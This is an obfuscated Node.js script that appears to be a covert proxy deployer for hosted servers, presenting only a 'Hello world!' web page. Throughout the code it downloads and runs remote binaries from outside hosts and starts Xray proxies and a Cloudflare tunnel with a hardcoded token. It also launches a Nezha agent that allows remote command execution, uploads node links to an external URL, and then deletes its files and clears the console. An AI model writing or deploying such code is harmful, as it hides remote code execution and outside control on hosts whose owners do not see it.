const _0x2fe022=_0x27c1;(function(_0x4e2a48,_0x509f18){const _0x2abee5=_0x27c1,_0x4f6430=_0x4e2a48();while(!![]){try{const _0x51a2ca=-parseInt(_0x2abee5(0x185))/0x1+-parseInt(_0x2abee5(0x12a))/0x2*(-parseInt(_0x2abee5(0x16f))/0x3)+parseInt(_0x2abee5(0x173))/0x4*(-parseInt(_0x2abee5(0x12c))/0x5)+parseInt(_0x2abee5(0x17b))/0x6+parseInt(_0x2abee5(0x135))/0x7*(-parseInt(_0x2abee5(0x1c1))/0x8)+-parseInt(_0x2abee5(0x1d2))/0x9+-parseInt(_0x2abee5(0x142))/0xa*(-parseInt(_0x2abee5(0x10f))/0xb);if(_0x51a2ca===_0x509f18)break;else _0x4f6430['push'](_0x4f6430['shift']());}catch(_0x3a8ddf){_0x4f6430['push'](_0x4f6430['shift']());}}}(_0x3f7a,0xc12ca));const express=require(_0x2fe022(0x172)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2fe022(0x115)),{promisify}=require(_0x2fe022(0x123)),exec=promisify(require(_0x2fe022(0x127))[_0x2fe022(0x1ca)]),{execSync}=require(_0x2fe022(0x127)),UPLOAD_URL=process[_0x2fe022(0x186)][_0x2fe022(0x1a0)]||'',PROJECT_URL=process[_0x2fe022(0x186)][_0x2fe022(0x163)]||'',AUTO_ACCESS=process['env'][_0x2fe022(0x121)]||![],FILE_PATH=process[_0x2fe022(0x186)][_0x2fe022(0x13a)]||_0x2fe022(0x1a9),SUB_PATH=process['env'][_0x2fe022(0x15a)]||'sub',PORT=process[_0x2fe022(0x186)][_0x2fe022(0x14c)]||process[_0x2fe022(0x186)][_0x2fe022(0x12d)]||0x1e6e,UUID=process[_0x2fe022(0x186)][_0x2fe022(0x151)]||_0x2fe022(0x112),NEZHA_SERVER=process['env']['NEZHA_SERVER']||_0x2fe022(0x15b),NEZHA_PORT=process[_0x2fe022(0x186)][_0x2fe022(0x1b5)]||'',NEZHA_KEY=process[_0x2fe022(0x186)][_0x2fe022(0x18d)]||_0x2fe022(0x183),ARGO_DOMAIN=process[_0x2fe022(0x186)][_0x2fe022(0x1aa)]||_0x2fe022(0x162),ARGO_AUTH=process[_0x2fe022(0x186)][_0x2fe022(0x1c3)]||_0x2fe022(0x15e),ARGO_PORT=process[_0x2fe022(0x186)][_0x2fe022(0x189)]||0xc773,CFIP=process[_0x2fe022(0x186)][_0x2fe022(0x1a6)]||'www.visa.com.sg',CFPORT=process[_0x2fe022(0x186)][_0x2fe022(0x164)]||0x1bb,NAME=process[_0x2fe022(0x186)][_0x2fe022(0x1be)]||_0x2fe022(0x1c4);!fs[_0x2fe022(0x14d)](FILE_PATH)?(fs[_0x2fe022(0x17f)](FILE_PATH),console[_0x2fe022(0x18e)](FILE_PATH+'\x20is\x20created')):console[_0x2fe022(0x18e)](FILE_PATH+_0x2fe022(0x1a4));let npmPath=path[_0x2fe022(0x120)](FILE_PATH,'npm'),phpPath=path[_0x2fe022(0x120)](FILE_PATH,_0x2fe022(0x1d3)),webPath=path['join'](FILE_PATH,_0x2fe022(0x136)),botPath=path[_0x2fe022(0x120)](FILE_PATH,'bot'),subPath=path[_0x2fe022(0x120)](FILE_PATH,_0x2fe022(0x140)),listPath=path[_0x2fe022(0x120)](FILE_PATH,'list.txt'),bootLogPath=path[_0x2fe022(0x120)](FILE_PATH,_0x2fe022(0x14a)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x11fc50=_0x2fe022;try{if(!UPLOAD_URL)return;if(!fs[_0x11fc50(0x14d)](subPath))return;let _0x36a876;try{_0x36a876=fs[_0x11fc50(0x198)](subPath,_0x11fc50(0x156));}catch{return null;}const _0x378a11=Buffer[_0x11fc50(0x114)](_0x36a876,'base64')[_0x11fc50(0x11a)](_0x11fc50(0x156)),_0x351615=_0x378a11['split']('\x0a')[_0x11fc50(0x111)](_0x38a149=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x11fc50(0x153)](_0x38a149));if(_0x351615[_0x11fc50(0x1ae)]===0x0)return;return axios[_0x11fc50(0x1b4)](UPLOAD_URL+_0x11fc50(0x166),JSON['stringify']({'nodes':_0x351615}),{'headers':{'Content-Type':_0x11fc50(0x137)}})[_0x11fc50(0x11d)](_0x4ca41f=>{return null;});}catch(_0x33d79b){return null;}}function cleanupOldFiles(){const _0x435053=_0x2fe022,_0x169dcb=['web',_0x435053(0x15f),_0x435053(0x11e),_0x435053(0x1d3),_0x435053(0x140),'boot.log'];_0x169dcb[_0x435053(0x169)](_0x20a81e=>{const _0x5cefb8=_0x435053,_0x513eab=path[_0x5cefb8(0x120)](FILE_PATH,_0x20a81e);fs[_0x5cefb8(0x15d)](_0x513eab,()=>{});});}app['get']('/',function(_0x210c70,_0x49f036){const _0x20f1a6=_0x2fe022;_0x49f036[_0x20f1a6(0x17a)]('Hello\x20world!');});const config={'log':{'access':_0x2fe022(0x14e),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2fe022(0x17d)}],'decryption':_0x2fe022(0x13b),'fallbacks':[{'dest':0xbb9},{'path':_0x2fe022(0x147),'dest':0xbba},{'path':_0x2fe022(0x13d),'dest':0xbbb},{'path':_0x2fe022(0x19a),'dest':0xbbc}]},'streamSettings':{'network':_0x2fe022(0x11c)}},{'port':0xbb9,'listen':_0x2fe022(0x170),'protocol':_0x2fe022(0x14f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2fe022(0x11c),'security':_0x2fe022(0x13b)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2fe022(0x14f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2fe022(0x13b)},'streamSettings':{'network':'ws','security':_0x2fe022(0x13b),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2fe022(0x1a8),'tls',_0x2fe022(0x187)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2fe022(0x170),'protocol':_0x2fe022(0x175),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2fe022(0x13d)}},'sniffing':{'enabled':!![],'destOverride':[_0x2fe022(0x1a8),'tls',_0x2fe022(0x187)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2fe022(0x1cd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2fe022(0x19a)}},'sniffing':{'enabled':!![],'destOverride':[_0x2fe022(0x1a8),'tls',_0x2fe022(0x187)],'metadataOnly':![]}}],'dns':{'servers':[_0x2fe022(0x1b7)]},'outbounds':[{'protocol':_0x2fe022(0x196),'tag':_0x2fe022(0x143)},{'protocol':_0x2fe022(0x116),'tag':_0x2fe022(0x128)}]};fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON[_0x2fe022(0x1a3)](config,null,0x2));function getSystemArchitecture(){const _0x21a90f=_0x2fe022,_0x12aef7=os[_0x21a90f(0x1c7)]();return _0x12aef7===_0x21a90f(0x10d)||_0x12aef7===_0x21a90f(0x16d)||_0x12aef7===_0x21a90f(0x18a)?'arm':_0x21a90f(0x19e);}function _0x27c1(_0x54e57c,_0x44e3e5){const _0x3f7a3a=_0x3f7a();return _0x27c1=function(_0x27c12e,_0x4480b6){_0x27c12e=_0x27c12e-0x10d;let _0x215d7b=_0x3f7a3a[_0x27c12e];return _0x215d7b;},_0x27c1(_0x54e57c,_0x44e3e5);}function downloadFile(_0x45c52e,_0x4be018,_0x30c60f){const _0x2c55b1=_0x2fe022,_0x1c7d0b=path[_0x2c55b1(0x120)](FILE_PATH,_0x45c52e),_0x497150=fs[_0x2c55b1(0x138)](_0x1c7d0b);axios({'method':'get','url':_0x4be018,'responseType':'stream'})[_0x2c55b1(0x154)](_0x153459=>{const _0x19317b=_0x2c55b1;_0x153459[_0x19317b(0x1a1)]['pipe'](_0x497150),_0x497150['on'](_0x19317b(0x1cc),()=>{const _0x27e2bd=_0x19317b;_0x497150['close'](),console[_0x27e2bd(0x18e)](_0x27e2bd(0x168)+_0x45c52e+'\x20successfully'),_0x30c60f(null,_0x45c52e);}),_0x497150['on']('error',_0x43fd0a=>{const _0x2b7f52=_0x19317b;fs[_0x2b7f52(0x15d)](_0x1c7d0b,()=>{});const _0x16210d='Download\x20'+_0x45c52e+_0x2b7f52(0x1c9)+_0x43fd0a[_0x2b7f52(0x16b)];console['error'](_0x16210d),_0x30c60f(_0x16210d);});})[_0x2c55b1(0x11d)](_0x2f7ed4=>{const _0x1cea9d=_0x2c55b1,_0x1c61cb=_0x1cea9d(0x168)+_0x45c52e+'\x20failed:\x20'+_0x2f7ed4[_0x1cea9d(0x16b)];console[_0x1cea9d(0x1b1)](_0x1c61cb),_0x30c60f(_0x1c61cb);});}function _0x3f7a(){const _0x5e9a52=['express','4bDOqOF','pop','vmess','ARGO_DOMAIN:','php\x20is\x20running','Skipping\x20adding\x20automatic\x20access\x20task','chmod','send','5643408ccBcbI','NEZHA\x20variable\x20is\x20empty,skip\x20running','xtls-rprx-vision','2083','mkdirSync','php\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/v1','--tls','WynI3wh66JXCegtiPLHLDOkjKFnzWz2S','/php\x20-c\x20\x22','66752TyizIc','env','quic','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ARGO_PORT','aarch64','https://arm64.ssss.nyc.mn/v1','Error\x20downloading\x20files:','NEZHA_KEY','log','添加URL失败:\x20','2053','bot\x20is\x20running.','https://arm64.ssss.nyc.mn/web','./web','Error\x20executing\x20command:\x20','https://oooo.serv00.net/add-url','freedom','./php','readFileSync','Empowerment\x20failed\x20for\x20','/trojan-argo','\x0a\x20\x20\x0atrojan://','https://amd64.ssss.nyc.mn/agent','/api/add-subscriptions','amd','\x0a\x20\x20\x20\x20','UPLOAD_URL','data','\x0avless://','stringify','\x20already\x20exists','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','CFIP','\x0a\x20\x20tunnel:\x20','http','./tmp','ARGO_DOMAIN','8443','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20\x0avmess://','length','web\x20running\x20error:\x20','fileUrl','error','tunnel.json','&path=%2Fvless-argo%3Fed%3D2560#','post','NEZHA_PORT','Error\x20reading\x20boot.log:','https+local://8.8.8.8/dns-query','ArgoDomain:','./bot','TunnelSecret','unlinkSync','/tunnel.yml\x20run','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NAME','response','npm\x20running\x20error:\x20','1984FBjUZQ','https://amd64.ssss.nyc.mn/2go','ARGO_AUTH','Vls','npm\x20is\x20running','tunnel.yml','arch','get','\x20failed:\x20','exec','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','finish','trojan','\x20-p\x20','all','trim','unshift','3203784rFaWBn','php','arm','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','17754EMVmZt','/web\x20-c\x20','filter','cc36b021-2926-4123-a191-4d517b374d8c','&type=ws&host=','from','path','blackhole','map','nohup\x20','Empowerment\x20success\x20for\x20','toString','writeFileSync','tcp','catch','npm','/vmess-argo?ed=2560','join','AUTO_ACCESS','Content-Type','util','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','config.yaml','has','child_process','block','\x20>/dev/null\x202>&1\x20&','213726LCePwW','https://arm64.ssss.nyc.mn/agent','5197825GQbNKU','PORT','listen','push','web\x20is\x20running','2096','/npm\x20-s\x20','split','/api/add-nodes','35567vBKIff','web','application/json','createWriteStream','true','FILE_PATH','none','set','/vmess-argo','tls','443','sub.txt','\x0a\x20\x20credentials-file:\x20','15280pwWIiS','direct','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','match','includes','/vless-argo','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','boot.log','/bot\x20','SERVER_PORT','existsSync','/dev/null','vless','fileName','UUID','?encryption=none&security=tls&sni=','test','then','clear','utf-8','https://arm64.ssss.nyc.mn/2go','status','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','SUB_PATH','nzag.faiz.us.kg:80','\x20>/dev/null\x202>&1','unlink','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiYWMyMTMyZGItMjEzMS00NGQ0LWIwMDMtZjU1NDc0M2FkODExIiwicyI6Ik1qY3pPVFJpWVdFdFptRXlPUzAwT0dZekxXSTRNakl0WlRZeE5UTXdOMlptWVdaaiJ9','bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','text/plain;\x20charset=utf-8','galaxyus.faiz.us.kg','PROJECT_URL','CFPORT','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','/api/delete-nodes','2087','Download\x20','forEach','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','message','base64','arm64','?security=tls&sni=','3ydVFAZ','127.0.0.1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'];_0x3f7a=function(){return _0x5e9a52;};return _0x3f7a();}async function downloadFilesAndRun(){const _0x1c8991=_0x2fe022,_0x5a1f56=getSystemArchitecture(),_0x559ec0=getFilesForArchitecture(_0x5a1f56);if(_0x559ec0[_0x1c8991(0x1ae)]===0x0){console[_0x1c8991(0x18e)](_0x1c8991(0x1a5));return;}const _0xbbef83=_0x559ec0[_0x1c8991(0x117)](_0x79b09c=>{return new Promise((_0x441f94,_0x2d2a26)=>{const _0x2de931=_0x27c1;downloadFile(_0x79b09c[_0x2de931(0x150)],_0x79b09c[_0x2de931(0x1b0)],(_0x12a5ae,_0x25c0ea)=>{_0x12a5ae?_0x2d2a26(_0x12a5ae):_0x441f94(_0x25c0ea);});});});try{await Promise[_0x1c8991(0x1cf)](_0xbbef83);}catch(_0x24e115){console[_0x1c8991(0x1b1)](_0x1c8991(0x18c),_0x24e115);return;}function _0x59b716(_0x2e2d60){const _0x189403=_0x1c8991,_0x46e4df=0x1fd;_0x2e2d60[_0x189403(0x169)](_0x57f172=>{const _0x4bc0b0=_0x189403,_0x3e156a=path[_0x4bc0b0(0x120)](FILE_PATH,_0x57f172);fs[_0x4bc0b0(0x14d)](_0x3e156a)&&fs[_0x4bc0b0(0x179)](_0x3e156a,_0x46e4df,_0x23fbb3=>{const _0x2529f7=_0x4bc0b0;_0x23fbb3?console['error'](_0x2529f7(0x199)+_0x3e156a+':\x20'+_0x23fbb3):console[_0x2529f7(0x18e)](_0x2529f7(0x119)+_0x3e156a+':\x20'+_0x46e4df['toString'](0x8));});});}const _0x403442=NEZHA_PORT?['./npm',_0x1c8991(0x193),_0x1c8991(0x1b9)]:[_0x1c8991(0x197),'./web','./bot'];_0x59b716(_0x403442);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5102c6=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1c8991(0x133)](':')[_0x1c8991(0x174)]():'',_0x90e673=new Set([_0x1c8991(0x13f),_0x1c8991(0x1ab),_0x1c8991(0x131),_0x1c8991(0x167),_0x1c8991(0x17e),_0x1c8991(0x190)]),_0xf403ae=_0x90e673[_0x1c8991(0x126)](_0x5102c6)?_0x1c8991(0x139):'false',_0x5ac325='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x1c8991(0x1cb)+_0xf403ae+_0x1c8991(0x1bd)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x1c8991(0x125)),_0x5ac325);const _0x2e1d19=_0x1c8991(0x118)+FILE_PATH+_0x1c8991(0x184)+FILE_PATH+_0x1c8991(0x124);try{await exec(_0x2e1d19),console[_0x1c8991(0x18e)](_0x1c8991(0x177)),await new Promise(_0x44600e=>setTimeout(_0x44600e,0x3e8));}catch(_0x107741){console['error'](_0x1c8991(0x180)+_0x107741);}}else{let _0x3201f8='';const _0x5dc871=[_0x1c8991(0x13f),_0x1c8991(0x1ab),'2096',_0x1c8991(0x167),_0x1c8991(0x17e),'2053'];_0x5dc871[_0x1c8991(0x146)](NEZHA_PORT)&&(_0x3201f8=_0x1c8991(0x182));const _0x8e4167=_0x1c8991(0x118)+FILE_PATH+_0x1c8991(0x132)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1c8991(0x1ce)+NEZHA_KEY+'\x20'+_0x3201f8+_0x1c8991(0x129);try{await exec(_0x8e4167),console[_0x1c8991(0x18e)](_0x1c8991(0x1c5)),await new Promise(_0x278eaa=>setTimeout(_0x278eaa,0x3e8));}catch(_0x381f63){console[_0x1c8991(0x1b1)](_0x1c8991(0x1c0)+_0x381f63);}}}else console['log'](_0x1c8991(0x17c));const _0x51ad25='nohup\x20'+FILE_PATH+_0x1c8991(0x110)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x51ad25),console[_0x1c8991(0x18e)](_0x1c8991(0x130)),await new Promise(_0x1344bf=>setTimeout(_0x1344bf,0x3e8));}catch(_0x201444){console[_0x1c8991(0x1b1)](_0x1c8991(0x1af)+_0x201444);}if(fs[_0x1c8991(0x14d)](path['join'](FILE_PATH,_0x1c8991(0x15f)))){let _0x3daf4a;if(ARGO_AUTH[_0x1c8991(0x145)](/^[A-Z0-9a-z=]{120,250}$/))_0x3daf4a=_0x1c8991(0x188)+ARGO_AUTH;else ARGO_AUTH[_0x1c8991(0x145)](/TunnelSecret/)?_0x3daf4a=_0x1c8991(0x149)+FILE_PATH+_0x1c8991(0x1bc):_0x3daf4a=_0x1c8991(0x171)+FILE_PATH+_0x1c8991(0x160)+ARGO_PORT;try{await exec('nohup\x20'+FILE_PATH+_0x1c8991(0x14b)+_0x3daf4a+'\x20>/dev/null\x202>&1\x20&'),console[_0x1c8991(0x18e)]('bot\x20is\x20running'),await new Promise(_0x1d650b=>setTimeout(_0x1d650b,0x7d0));}catch(_0xfb9500){console[_0x1c8991(0x1b1)]('Error\x20executing\x20command:\x20'+_0xfb9500);}}await new Promise(_0x5b95de=>setTimeout(_0x5b95de,0x1388));}function getFilesForArchitecture(_0x1eea8a){const _0x330ff0=_0x2fe022;let _0x217406;_0x1eea8a===_0x330ff0(0x10d)?_0x217406=[{'fileName':_0x330ff0(0x136),'fileUrl':_0x330ff0(0x192)},{'fileName':_0x330ff0(0x15f),'fileUrl':_0x330ff0(0x157)}]:_0x217406=[{'fileName':'web','fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x330ff0(0x15f),'fileUrl':_0x330ff0(0x1c2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3907b7=_0x1eea8a==='arm'?_0x330ff0(0x12b):_0x330ff0(0x19c);_0x217406[_0x330ff0(0x1d1)]({'fileName':_0x330ff0(0x11e),'fileUrl':_0x3907b7});}else{const _0x3f20ab=_0x1eea8a===_0x330ff0(0x10d)?_0x330ff0(0x18b):_0x330ff0(0x181);_0x217406[_0x330ff0(0x1d1)]({'fileName':'php','fileUrl':_0x3f20ab});}}return _0x217406;}function argoType(){const _0x1d1bb5=_0x2fe022;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x1d1bb5(0x144));return;}if(ARGO_AUTH[_0x1d1bb5(0x146)](_0x1d1bb5(0x1ba))){fs[_0x1d1bb5(0x11b)](path[_0x1d1bb5(0x120)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x46f09a=_0x1d1bb5(0x1a7)+ARGO_AUTH['split']('\x22')[0xb]+_0x1d1bb5(0x141)+path[_0x1d1bb5(0x120)](FILE_PATH,_0x1d1bb5(0x1b2))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1d1bb5(0x10e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1d1bb5(0x11b)](path['join'](FILE_PATH,_0x1d1bb5(0x1c6)),_0x46f09a);}else console[_0x1d1bb5(0x18e)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x306151=_0x2fe022;let _0x4ea4c3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4ea4c3=ARGO_DOMAIN,console[_0x306151(0x18e)](_0x306151(0x176),_0x4ea4c3),await _0x1080f9(_0x4ea4c3);else try{const _0x38b4ba=fs[_0x306151(0x198)](path[_0x306151(0x120)](FILE_PATH,_0x306151(0x14a)),_0x306151(0x156)),_0x697e9f=_0x38b4ba[_0x306151(0x133)]('\x0a'),_0x200caa=[];_0x697e9f[_0x306151(0x169)](_0x53ec61=>{const _0x508989=_0x306151,_0x2a0eaa=_0x53ec61[_0x508989(0x145)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2a0eaa){const _0xcc351=_0x2a0eaa[0x1];_0x200caa[_0x508989(0x12f)](_0xcc351);}});if(_0x200caa[_0x306151(0x1ae)]>0x0)_0x4ea4c3=_0x200caa[0x0],console['log'](_0x306151(0x1b8),_0x4ea4c3),await _0x1080f9(_0x4ea4c3);else{console[_0x306151(0x18e)](_0x306151(0x16a)),fs[_0x306151(0x1bb)](path[_0x306151(0x120)](FILE_PATH,_0x306151(0x14a)));async function _0x386e52(){const _0x2d4d02=_0x306151;try{await exec(_0x2d4d02(0x165));}catch(_0x46193d){}}_0x386e52(),await new Promise(_0x24e014=>setTimeout(_0x24e014,0xbb8));const _0x43932d=_0x306151(0x171)+FILE_PATH+_0x306151(0x160)+ARGO_PORT;try{await exec(_0x306151(0x118)+path[_0x306151(0x120)](FILE_PATH,_0x306151(0x15f))+'\x20'+_0x43932d+'\x20>/dev/null\x202>&1\x20&'),console[_0x306151(0x18e)](_0x306151(0x191)),await new Promise(_0x487ae4=>setTimeout(_0x487ae4,0xbb8)),await extractDomains();}catch(_0x3bd970){console[_0x306151(0x1b1)](_0x306151(0x194)+_0x3bd970);}}}catch(_0x4ab273){console[_0x306151(0x1b1)](_0x306151(0x1b6),_0x4ab273);}async function _0x1080f9(_0x17fc97){const _0x46261b=_0x306151,_0x3a28fa=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x46261b(0x156)}),_0x3d875b=_0x3a28fa[_0x46261b(0x1d0)]();return new Promise(_0x3242e6=>{setTimeout(()=>{const _0x5bcde2=_0x27c1,_0x35fe8b={'v':'2','ps':NAME+'-'+_0x3d875b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5bcde2(0x13b),'net':'ws','type':_0x5bcde2(0x13b),'host':_0x17fc97,'path':_0x5bcde2(0x11f),'tls':_0x5bcde2(0x13e),'sni':_0x17fc97,'alpn':''},_0x25a911=_0x5bcde2(0x1a2)+UUID+'@'+CFIP+':'+CFPORT+_0x5bcde2(0x152)+_0x17fc97+_0x5bcde2(0x113)+_0x17fc97+_0x5bcde2(0x1b3)+NAME+'-'+_0x3d875b+_0x5bcde2(0x1ad)+Buffer[_0x5bcde2(0x114)](JSON[_0x5bcde2(0x1a3)](_0x35fe8b))[_0x5bcde2(0x11a)](_0x5bcde2(0x16c))+_0x5bcde2(0x19b)+UUID+'@'+CFIP+':'+CFPORT+_0x5bcde2(0x16e)+_0x17fc97+_0x5bcde2(0x113)+_0x17fc97+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x3d875b+_0x5bcde2(0x19f);console[_0x5bcde2(0x18e)](Buffer[_0x5bcde2(0x114)](_0x25a911)[_0x5bcde2(0x11a)](_0x5bcde2(0x16c))),fs[_0x5bcde2(0x11b)](subPath,Buffer[_0x5bcde2(0x114)](_0x25a911)[_0x5bcde2(0x11a)](_0x5bcde2(0x16c))),console['log'](FILE_PATH+_0x5bcde2(0x148)),uplodNodes(),app[_0x5bcde2(0x1c8)]('/'+SUB_PATH,(_0x2f78c3,_0x51fdb9)=>{const _0x6f77aa=_0x5bcde2,_0x469939=Buffer['from'](_0x25a911)['toString'](_0x6f77aa(0x16c));_0x51fdb9[_0x6f77aa(0x13c)](_0x6f77aa(0x122),_0x6f77aa(0x161)),_0x51fdb9[_0x6f77aa(0x17a)](_0x469939);}),_0x3242e6(_0x25a911);},0x7d0);});}}async function uplodNodes(){const _0x2a0b53=_0x2fe022;if(UPLOAD_URL&&PROJECT_URL){const _0x270ee4=PROJECT_URL+'/'+SUB_PATH,_0x427040={'subscription':[_0x270ee4]};try{const _0x95e0f8=await axios[_0x2a0b53(0x1b4)](UPLOAD_URL+_0x2a0b53(0x19d),_0x427040,{'headers':{'Content-Type':_0x2a0b53(0x137)}});if(_0x95e0f8[_0x2a0b53(0x158)]===0xc8)console[_0x2a0b53(0x18e)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x32543a){if(_0x32543a[_0x2a0b53(0x1bf)]){if(_0x32543a[_0x2a0b53(0x1bf)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3a258e=fs[_0x2a0b53(0x198)](listPath,_0x2a0b53(0x156)),_0x1877ef=_0x3a258e[_0x2a0b53(0x133)]('\x0a')[_0x2a0b53(0x111)](_0x548122=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x548122));if(_0x1877ef[_0x2a0b53(0x1ae)]===0x0)return;const _0x42a08b=JSON[_0x2a0b53(0x1a3)]({'nodes':_0x1877ef});try{await axios[_0x2a0b53(0x1b4)](UPLOAD_URL+_0x2a0b53(0x134),_0x42a08b,{'headers':{'Content-Type':_0x2a0b53(0x137)}});if(response[_0x2a0b53(0x158)]===0xc8)console[_0x2a0b53(0x18e)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x105c9e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2559a2=_0x27c1,_0x28e69e=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x28e69e[_0x2559a2(0x12f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x28e69e[_0x2559a2(0x12f)](phpPath);exec('rm\x20-rf\x20'+_0x28e69e['join']('\x20')+_0x2559a2(0x15c),_0x49df9e=>{const _0x3054ed=_0x2559a2;console[_0x3054ed(0x155)](),console['log']('App\x20is\x20running'),console[_0x3054ed(0x18e)](_0x3054ed(0x159));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xda427b=_0x2fe022;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xda427b(0x18e)](_0xda427b(0x178));return;}try{const _0x144e66=await axios[_0xda427b(0x1b4)](_0xda427b(0x195),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xda427b(0x137)}});console[_0xda427b(0x18e)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x449d19){console['error'](_0xda427b(0x18f)+_0x449d19['message']);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x2fe022(0x12e)](PORT,()=>console['log'](_0x2fe022(0x1ac)+PORT+'!'));
